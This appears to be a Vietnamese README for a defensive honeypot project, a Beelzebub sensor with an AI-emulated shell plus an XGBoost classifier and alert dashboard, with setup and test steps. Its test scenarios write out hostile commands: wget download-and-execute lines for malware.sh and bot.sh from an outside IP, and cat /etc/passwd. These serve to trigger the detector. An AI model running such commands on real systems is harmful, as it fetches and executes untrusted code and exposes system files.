# Hệ Thống Phát Hiện & Phân Loại Tấn Công Honeypot (ML XGBoost + SOC Dashboard)

Hệ thống giám sát và phòng thủ không gian mạng theo mô hình phân tán 2 máy ảo (Multi-VM Architecture):
- **VM 1 (Honeypot Sensor)**: Chạy bẫy Beelzebub + AI Deception Engine (Ollama/OpenAI) mô phỏng terminal Ubuntu tương tác, ghi nhật ký ra `beelzebub.json`.
- **VM 2 (ML Engine & SOC Dashboard)**: Nhận log theo thời gian thực từ VM 1, kích hoạt **Vòng Lặp 2: Detection Pipeline**, trích xuất vector 14 đặc trưng, suy diễn bằng mô hình **XGBoost (độ tin cậy >98%)**, cập nhật biểu đồ và **BẬT CHUÔNG CẢNH BÁO ĐỎ (Audio Siren & Flashing Alert)** khi phát hiện tấn công Exploit/RCE.

---

## 🏗️ Kiến Trúc Hệ Thống (Sequence Diagram)

```mermaid
sequenceDiagram
    autonumber
    actor Attacker as Kẻ Tấn Công (Kali Linux)
    participant Honeypot as Bẫy Beelzebub (VM 1 :2222)
    participant AI as Bộ Não AI (Ollama/OpenAI)
    participant Log as File beelzebub.json (VM 1)
    participant Shipper as Log Shipper (VM 1)
    participant ML as Bộ Máy ML XGBoost (VM 2)
    participant Dashboard as Giao Diện Dashboard (VM 2 :8080)

    rect rgb(20, 25, 35)
    note over Attacker, Log: VÒNG LẶP 1: ĐÁNH LỪA BẰNG AI (DECEPTION LOOP TRÊN VM 1)
    Attacker->>Honeypot: SSH Login (root / 123456)
    Honeypot->>Log: Ghi nhận sự kiện Login (IP, User, Pass)
    Honeypot-->>Attacker: Cho phép đăng nhập (Mở AI Shell)
    Attacker->>Honeypot: Gõ lệnh: "wget malware.sh && chmod 777 malware.sh"
    Honeypot->>AI: Chuyển câu lệnh + Prompt "Đóng vai terminal Ubuntu"
    AI-->>Honeypot: Sinh văn bản kết quả hiển thị tự nhiên
    Honeypot-->>Attacker: In kết quả ra màn hình (Attacker tin là máy thật)
    Honeypot->>Log: Ghi nhận câu lệnh + timestamp
    Attacker->>Honeypot: Gõ "exit" (hoặc timeout ngắt kết nối)
    Honeypot->>Log: Ghi nhận sự kiện đóng phiên (Session Closed)
    end

    rect rgb(35, 20, 25)
    note over Shipper, Dashboard: VÒNG LẶP 2: PHÂN TÍCH & PHÂN LOẠI ML (DETECTION PIPELINE TRÊN VM 2)
    Shipper->>Dashboard: Stream log qua HTTP POST /api/ingest
    Dashboard->>ML: File Watcher / Ingest Listener phát hiện phiên vừa kết thúc
    ML->>ML: Gộp tất cả sự kiện có cùng Session ID
    ML->>ML: Trích xuất vector 14 đặc trưng (thời lượng, entropy, pass sai, download...)
    ML->>ML: Nạp vào XGBoost.predict() & predict_proba()
    ML-->>Dashboard: Đẩy kết quả: [Tấn công Exploit - Tin cậy: 98.5%]
    Dashboard-->>Dashboard: Cập nhật biểu đồ & BẬT CHUÔNG CẢNH BÁO ĐỎ (Audio Siren + Banner)!
    end
```



---

## 📊 Vector 14 Đặc Trưng Phân Loại An Ninh Mạng (XGBoost)

Bộ máy ML trích xuất chính xác 14 đặc trưng theo thiết kế:

| STT | Tên đặc trưng (`Feature Name`) | Đơn vị | Ý nghĩa phân tích an ninh |
|:---:|:---|:---:|:---|
| **1** | `duration_seconds` | Giây | Thời lượng tương tác của phiên (từ login đến logout/exit) |
| **2** | `total_events` | Số lượng | Tổng số hành động/gói tin ghi nhận trong phiên |
| **3** | `total_commands_count` | Số lượng | Tổng số câu lệnh thực thi trong terminal |
| **4** | `failed_login_count` | Số lần | Số lần thử mật khẩu sai trước đó |
| **5** | `failed_login_ratio` | Tỉ lệ (0-1) | Tỉ lệ thử mật khẩu sai / tổng số lần đăng nhập |
| **6** | `success_login_count` | Số lần | Số lần đăng nhập thành công vào honeypot |
| **7** | `unique_usernames_count` | Số lượng | Số lượng tài khoản username khác nhau bị nhắm tới |
| **8** | `unique_passwords_count` | Số lượng | Số lượng mật khẩu độc nhất attacker mang theo |
| **9** | `username_entropy` | Bits | Shannon Entropy của username (phát hiện từ điển ngẫu nhiên) |
| **10** | `password_entropy` | Bits | Shannon Entropy của password |
| **11** | `is_root_targeted` | 0 hoặc 1 | Attacker có nhắm mục tiêu vào tài khoản đặc quyền root |
| **12** | `unique_commands_ratio` | Tỉ lệ (0-1) | Tỉ lệ lệnh độc nhất (phân biệt bot lặp lệnh vs người gõ tay) |
| **13** | `avg_inter_command_delay` | Giây | Độ trễ trung bình giữa các lệnh (Bot < 0.5s vs Người > 2s) |
| **14** | `file_download_count` | Số lượng | Phát hiện lệnh tải mã độc / Exploit (`wget`, `curl`, `tftp`...) |

### Các lớp tấn công mô hình phân loại:
1. **`Tấn công Exploit / Malware Dropper` (`Automated_Malware_Dropper`)**: Kích hoạt cảnh báo nguy hiểm mức **CRITICAL** (Chuông đỏ hú còi, tin cậy 98.5%).
2. **`Tấn công Dò quét mật khẩu` (`Brute_Force_Bot`)**: Mức cảnh báo **HIGH/MEDIUM**.
3. **`Xâm nhập tương tác` (`Interactive_Attacker`)**: Attacker thủ công điều khiển shell.
4. **`Do thám & Quét cổng` (`Reconnaissance_Probe`)**: Mức cảnh báo **LOW**.

---

## 🚀 Hướng Dẫn Cài Đặt & Triển Khai Trên VM 2 (ML + Dashboard)

### Bước 1: Chuẩn bị máy ảo VM 2
- Hệ điều hành: Ubuntu 22.04 LTS hoặc Debian 12 (hoặc bất kỳ Linux nào có Python 3.10+)
- Cấu hình đề xuất: 2 vCPU, 2GB - 4GB RAM, 20GB Disk.

### Bước 2: Copy source code sang VM 2
Copy thư mục `honeypot-attack-detection` sang thư mục `/opt/beelzebub-dashboard` trên VM 2:
```bash
sudo mkdir -p /opt/beelzebub-dashboard
sudo chown -R $USER:$USER /opt/beelzebub-dashboard
# Copy code từ máy bạn sang VM2 qua scp:
# scp -r * user@<IP_VM2>:/opt/beelzebub-dashboard/
```

### Bước 3: Cài đặt môi trường Python & dependencies
```bash
cd /opt/beelzebub-dashboard
chmod +x run.sh
./run.sh
```
Lệnh trên sẽ tự động:
1. Tạo môi trường ảo `python3 -m venv .venv`
2. Nạp các gói: `fastapi`, `uvicorn`, `scikit-learn`, `xgboost`, `joblib`, `pandas`, `numpy`
3. Khởi động Web Server tại cổng `http://0.0.0.0:8080`

### Bước 4: Cài đặt chạy ngầm tự động (Systemd Service)
```bash
sudo cp beelzebub-dashboard.service /etc/systemd/system/
sudo systemctl daemon-reload
sudo systemctl enable --now beelzebub-dashboard
sudo systemctl status beelzebub-dashboard
```

Truy cập Dashboard từ trình duyệt: `http://<IP_VM2>:8080`.

---

## 📡 Cấu Hình Chuyển Dữ Liệu Từ VM 1 (Honeypot) Sang VM 2 (ML)

Trên **VM 1 (Honeypot VM)**, chạy file `shipper.py` để stream log theo thời gian thực sang VM 2:

```bash
# Giả sử IP của VM 2 là 192.168.1.100:
python3 shipper.py --vm2-url http://192.168.1.100:8080/api/ingest --log-file beelzebub.json
```

Hoặc nếu Beelzebub đang chạy trong Docker container tên là `beelzebub`:
```bash
python3 shipper.py --vm2-url http://192.168.1.100:8080/api/ingest --container beelzebub
```

*Ghi chú*: `shipper.py` hoàn toàn dùng thư viện chuẩn của Python (`urllib`), **không cần cài thêm bất kỳ gói pip nào trên VM 1**, đảm bảo Honeypot VM luôn siêu nhẹ và an toàn.

---

## 🧪 Kịch Bản Kiểm Thử & Kích Hoạt Chuông Cảnh Báo Đỏ

### Cách 1: Bấm nút Test nhanh trên giao diện Dashboard
Trên thanh điều hướng đầu trang của Dashboard (`http://<IP_VM2>:8080`), bấm nút:
> **⚡ Test Exploit & Báo Động**

Hệ thống sẽ ngay lập tức:
1. Giả lập phiên SSH của Kali Linux vào Beelzebub
2. Thực thi lệnh Exploit: `wget http://185.220.101.5/malware.sh && chmod 777 malware.sh && ./malware.sh`
3. Đóng phiên (`exit`)
4. XGBoost trích xuất 14 đặc trưng và phân loại **[Tấn công Exploit - Tin cậy: 98.5%]**
5. **Còi báo động đỏ vang lên và banner đỏ chớp nhấp nháy!**
6. Bấm **"🔍 Xem 14 Đặc trưng ML"** để xem trực quan từng thông số toán học.

### Cách 2: Tấn công trực tiếp từ Kali Linux
Từ máy Kali Linux, kết nối SSH vào bẫy Beelzebub trên VM 1:
```bash
ssh root@<IP_VM1> -p 2222
# Nhập pass: 123456
# Gõ các lệnh kiểm tra:
uname -a
cat /etc/passwd
wget http://185.220.101.5/bot.sh && chmod 777 bot.sh && ./bot.sh
exit
```
Ngay khi bạn gõ `exit`, trên màn hình Dashboard ở VM 2 chuông cảnh báo đỏ sẽ tự động hú và hiển thị kết quả phân loại!
